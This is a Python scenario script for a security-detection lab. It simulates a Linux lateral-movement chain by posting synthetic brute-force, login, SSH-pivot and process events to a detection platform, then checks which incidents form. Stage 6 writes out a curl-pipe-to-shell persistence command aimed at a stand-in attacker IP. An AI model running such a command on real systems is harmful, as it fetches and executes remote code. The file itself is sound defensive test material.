"""lateral_movement_chain — eight-stage Linux lateral-movement scenario (Phase 20 A1).

Compressed Linux attack: brute-force alice's SSH on host-1, log in from a hostile
src, pivot host-1 → host-2 (with curl|sh persistence), pivot host-2 → host-3.

Detector reality (current platform state — Phase 20 §A1 plan note):
  * py.auth.failed_burst         → fires (5× auth.failed in 60s for alice)
  * py.auth.anomalous_source_success → fires (alice from new IP after recent failures)
  * py.process.suspicious_child  → does NOT fire — no Linux sshd→bash→ssh branch in
    backend/app/detection/rules/process_suspicious_child.py:14-25.

Resulting incident (current platform state):
  * identity_compromise for alice (driven by anomalous_source_success).
  The cross-layer endpoint chain (identity_endpoint_chain, endpoint_compromise_join)
  cannot form — that's the Phase 22 LotL detector input the gap section captures.
"""
from __future__ import annotations

import asyncio
import logging
from datetime import datetime, timezone

from labs.simulator import event_templates as tmpl
from labs.simulator.client import SimulatorClient

log = logging.getLogger(__name__)

SCENARIO_NAME = "lateral_movement_chain"

_USER = "alice"
_ATTACKER_IP = "203.0.113.42"
_HOST_1 = "host-1.lab.local"
_HOST_2 = "host-2.lab.local"
_HOST_3 = "host-3.lab.local"
_HOST_1_IP = "10.0.1.10"
_HOST_2_IP = "10.0.1.20"

# Real-time offsets (seconds). Compressed by --speed factor.
_STAGE2_OFFSET = 60.0    # last brute-force failure → successful login
_STAGE3_OFFSET = 65.0    # → session.started on host-1
_STAGE4_OFFSET = 90.0    # → process chain on host-1 (sshd→bash→ssh host-2)
_STAGE5_OFFSET = 100.0   # → auth.succeeded on host-2 (first pivot)
_STAGE6_OFFSET = 130.0   # → process chain on host-2 (sshd→bash→curl|sh persistence)
_STAGE7_OFFSET = 160.0   # → process chain on host-2 (sshd→bash→ssh host-3)
_STAGE8_OFFSET = 165.0   # → auth.succeeded on host-3 (second pivot)


def _log(msg: str) -> None:
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


async def run(client: SimulatorClient, speed: float = 1.0) -> dict:
    """Fire all scenario events. Returns dict with event and incident IDs touched."""
    results: dict = {"events": [], "incidents_touched": []}

    def wait(offset_from: float, offset_to: float) -> float:
        return max(0.0, (offset_to - offset_from) * speed)

    # --- Stage 0: Register lab assets ---
    _log(
        f"Stage 0  Register assets: user:{_USER}  hosts:{_HOST_1},{_HOST_2},{_HOST_3}"
    )
    await client.register_asset("user", _USER)
    await client.register_asset("host", _HOST_1)
    await client.register_asset("host", _HOST_2)
    await client.register_asset("host", _HOST_3)

    # --- Stage 1: Brute force — 5× auth.failed on host-1 ---
    _log(f"Stage 1  Brute force: 5× auth.failed for {_USER} from {_ATTACKER_IP}")
    for i in range(5):
        ev = await client.post_event(
            tmpl.auth_failed(
                user=_USER,
                source_ip=_ATTACKER_IP,
                auth_type="ssh",
                dedupe_key=f"sim:lat-mvmt:auth.failed:{_USER}:{_ATTACKER_IP}:{i}",
            )
        )
        _record(results, ev)
        await asyncio.sleep(0.05)

    # --- Stage 2: Successful login from attacker IP on host-1 ---
    pause = wait(0.0, _STAGE2_OFFSET)
    _log(f"  -> waiting {pause:.1f}s before stage 2...")
    await asyncio.sleep(pause)

    _log(f"Stage 2  Successful login: auth.succeeded for {_USER} from {_ATTACKER_IP}")
    ev = await client.post_event(
        tmpl.auth_succeeded(
            user=_USER,
            source_ip=_ATTACKER_IP,
            auth_type="ssh",
            dedupe_key=f"sim:lat-mvmt:auth.succeeded:{_USER}:{_ATTACKER_IP}:host-1",
        )
    )
    _record(results, ev)
    if ev.get("incident_touched"):
        _log(f"  -> identity_compromise: {ev['incident_touched']}")

    # --- Stage 3: Session starts on host-1 ---
    pause = wait(_STAGE2_OFFSET, _STAGE3_OFFSET)
    _log(f"  -> waiting {pause:.1f}s before stage 3...")
    await asyncio.sleep(pause)

    _log(f"Stage 3  Session started: {_USER} @ {_HOST_1}")
    ev = await client.post_event(
        tmpl.session_started(
            user=_USER,
            host=_HOST_1,
            session_id="sim-lat-mvmt-alice-host1",
            dedupe_key=f"sim:lat-mvmt:session.started:{_USER}:{_HOST_1}",
        )
    )
    _record(results, ev)

    # --- Stage 4: Process chain on host-1 — sshd→bash→ssh host-2 ---
    pause = wait(_STAGE3_OFFSET, _STAGE4_OFFSET)
    _log(f"  -> waiting {pause:.1f}s before stage 4...")
    await asyncio.sleep(pause)

    _log(f"Stage 4  Pivot 1: sshd→bash→ssh {_USER}@{_HOST_2} on {_HOST_1}")
    ev = await client.post_event(
        tmpl.process_created(
            host=_HOST_1,
            image="/usr/bin/ssh",
            cmdline=f"ssh {_USER}@{_HOST_2}",
            pid=4242,
            ppid=2828,
            user=_USER,
            parent_image="/bin/bash",
            dedupe_key=f"sim:lat-mvmt:process.created:{_HOST_1}:ssh-pivot",
        )
    )
    _record(results, ev)

    # --- Stage 5: auth.succeeded on host-2 (first pivot lands) ---
    pause = wait(_STAGE4_OFFSET, _STAGE5_OFFSET)
    _log(f"  -> waiting {pause:.1f}s before stage 5...")
    await asyncio.sleep(pause)

    _log(f"Stage 5  First pivot: auth.succeeded for {_USER} from {_HOST_1_IP} on {_HOST_2}")
    ev = await client.post_event(
        tmpl.auth_succeeded(
            user=_USER,
            source_ip=_HOST_1_IP,
            auth_type="ssh",
            dedupe_key=f"sim:lat-mvmt:auth.succeeded:{_USER}:{_HOST_1_IP}:host-2",
        )
    )
    _record(results, ev)

    # --- Stage 6: Process chain on host-2 — sshd→bash→curl|sh persistence ---
    pause = wait(_STAGE5_OFFSET, _STAGE6_OFFSET)
    _log(f"  -> waiting {pause:.1f}s before stage 6...")
    await asyncio.sleep(pause)

    _log(f"Stage 6  Persistence: sshd→bash→curl|sh on {_HOST_2}")
    ev = await client.post_event(
        tmpl.process_created(
            host=_HOST_2,
            image="/bin/bash",
            cmdline=f"bash -c 'curl http://{_ATTACKER_IP}/persist | sh'",
            pid=4243,
            ppid=2829,
            user=_USER,
            parent_image="/usr/sbin/sshd",
            dedupe_key=f"sim:lat-mvmt:process.created:{_HOST_2}:curl-pipe-sh",
        )
    )
    _record(results, ev)

    # --- Stage 7: Process chain on host-2 — sshd→bash→ssh host-3 ---
    pause = wait(_STAGE6_OFFSET, _STAGE7_OFFSET)
    _log(f"  -> waiting {pause:.1f}s before stage 7...")
    await asyncio.sleep(pause)

    _log(f"Stage 7  Pivot 2: sshd→bash→ssh {_USER}@{_HOST_3} on {_HOST_2}")
    ev = await client.post_event(
        tmpl.process_created(
            host=_HOST_2,
            image="/usr/bin/ssh",
            cmdline=f"ssh {_USER}@{_HOST_3}",
            pid=4244,
            ppid=2829,
            user=_USER,
            parent_image="/bin/bash",
            dedupe_key=f"sim:lat-mvmt:process.created:{_HOST_2}:ssh-pivot",
        )
    )
    _record(results, ev)

    # --- Stage 8: auth.succeeded on host-3 (second pivot lands) ---
    pause = wait(_STAGE7_OFFSET, _STAGE8_OFFSET)
    _log(f"  -> waiting {pause:.1f}s before stage 8...")
    await asyncio.sleep(pause)

    _log(f"Stage 8  Second pivot: auth.succeeded for {_USER} from {_HOST_2_IP} on {_HOST_3}")
    ev = await client.post_event(
        tmpl.auth_succeeded(
            user=_USER,
            source_ip=_HOST_2_IP,
            auth_type="ssh",
            dedupe_key=f"sim:lat-mvmt:auth.succeeded:{_USER}:{_HOST_2_IP}:host-3",
        )
    )
    _record(results, ev)

    _log(
        f"Scenario complete. events={len(results['events'])}  "
        f"incidents_touched={len(results['incidents_touched'])}"
    )
    return results


async def verify(client: SimulatorClient) -> bool:
    """Assert expected incident was produced. Returns True on pass, False on fail.

    Per the Phase 20 §A1 plan note, current platform state produces a single
    identity_compromise incident — the endpoint chain cannot form because no
    Linux process-chain detector exists yet.
    """
    _log("Verifying scenario outcome...")
    incidents = await client.get_incidents(limit=100)

    identity = [
        i for i in incidents
        if i["kind"] == "identity_compromise"
        and (i.get("primary_user") or "").lower() == _USER
    ]

    ok = True

    if identity:
        _log(f"  PASS  identity_compromise for {_USER}: {identity[0]['id']}")
    else:
        _log(f"  FAIL  identity_compromise incident not found for user {_USER!r}")
        ok = False

    chain = [
        i for i in incidents
        if i["kind"] == "identity_endpoint_chain"
        and (i.get("primary_user") or "").lower() == _USER
    ]
    if chain:
        _log(
            f"  UNEXPECTED  identity_endpoint_chain incident found ({chain[0]['id']}) — "
            "the Linux process-chain detector gap was apparently closed; "
            "update the §A1 must_fire/must_not_fire list to match."
        )

    if ok:
        _log("Verification PASSED (current-platform-state acceptance: identity_compromise only)")
    else:
        _log("Verification FAILED — check logs above")

    return ok


def _record(results: dict, ev: dict) -> None:
    results["events"].append(ev.get("event_id"))
    if ev.get("incident_touched") and ev["incident_touched"] not in results["incidents_touched"]:
        results["incidents_touched"].append(ev["incident_touched"])
